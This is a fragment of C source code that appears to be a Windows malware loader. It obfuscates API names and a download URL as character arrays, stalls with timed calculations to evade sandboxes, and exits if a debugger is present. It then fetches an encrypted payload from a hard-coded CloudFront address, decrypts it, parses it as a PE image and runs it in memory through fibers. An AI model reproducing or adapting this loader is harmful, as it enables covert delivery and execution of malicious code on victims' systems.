	char sConvertThreadToFiber[] = { 'C', 'o', 'n', 'v', 'e', 'r', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'T', 'o', 'F', 'i', 'b', 'e', 'r', '\0' };
	tConvertThreadToFiber pConvertThreadToFiber = (tConvertThreadToFiber)hlpGetProcAddress(kern32, sConvertThreadToFiber);
	LPVOID mainFiberAddr = NULL;
	if (!(mainFiberAddr = pConvertThreadToFiber(NULL)))
	{
		PRINT_WINAPI_ERR(sConvertThreadToFiber);
		return FALSE;
	}

	char sSwitchToFiber[] = { 'S', 'w', 'i', 't', 'c', 'h', 'T', 'o', 'F', 'i', 'b', 'e', 'r', '\0' };
	tSwitchToFiber pSwitchToFiber = (tSwitchToFiber)hlpGetProcAddress(kern32, sSwitchToFiber);
	pSwitchToFiber(fiberAddr);

	return TRUE;
}

double PerformCalc(double base)
{
	// base 30 => 20 sec
	// base 28 => 12 sec
	// base 25 => 5 sec

	double result = 0.0;
	double i = pow(base, 7.0);

	while (i >= 0)
	{
		result += atan(i) * tan(i);
		i = i - 1.0;
	}

	return i;
}

int main(int argc, char* argv[])
{

	double res = 0.0;
	res = PerformCalc(30.0);
	if (res > 0.0)
		return -1;

	tGetProcessId pGetProcessId = (tGetProcessId)hlpGetProcAddress(hlpGetModuleHandle(L"kernel32.dll"), "GetProcessId");
	
	if (isDebug)
		printf("PID: %d\n", pGetProcessId(GetCurrentProcess()));

	PBYTE pFileBuffer = NULL;
	DWORD dwFileSize = 0;
	PE_HEADERS peHeaders = { 0 };
	char sURL[] = { 'h', 't', 't', 'p', 's', ':', '/', '/', 'd', '3', '4', 'j', '9', 'f', 'u', 'n', 'f', 't', '5', 'v', 'o', '3', '.', 'c', 'l', 'o', 'u', 'd', 'f', 'r', 'o', 'n', 't', '.', 'n', 'e', 't', '/', '1', '9', '4', '6', '1', 'b', '0', '0', '-', '5', '6', 'f', '8', '-', '1', '1', 'e', 'e', '-', '9', '4', 'e', 'f', '-', '1', '2', '8', '9', '1', '1', 'd', '0', 'd', '8', 'f', 'b', '/', 'd', 'e', 'a', '7', 'd', 'b', 'a', '7', '-', 'a', 'a', '8', 'a', '-', '4', 'a', '0', 'c', '-', 'b', 'b', '1', 'd', '-', '8', '2', 'd', '0', 'f', 'b', '9', '1', 'b', '3', '7', '9', '.', 't', 'x', 't', '\0' };

	if (IsDbgrPresent())
		return -1;

	if (!FetchPayloadFromWeb(sURL, &pFileBuffer, &dwFileSize))
		return -1;

	PBYTE pDecBuffer = LocalAlloc(LPTR, dwFileSize);
	if (!InitialDecrypt(pFileBuffer, dwFileSize, &pDecBuffer))
		return -1;

	if (!InitializePeStruct(&peHeaders, pDecBuffer, dwFileSize))
		return -1;


	res = PerformCalc(25.0);
	if (res > 0.0)
		return -1;

	LocalPeExec(&peHeaders);

	return 0;
}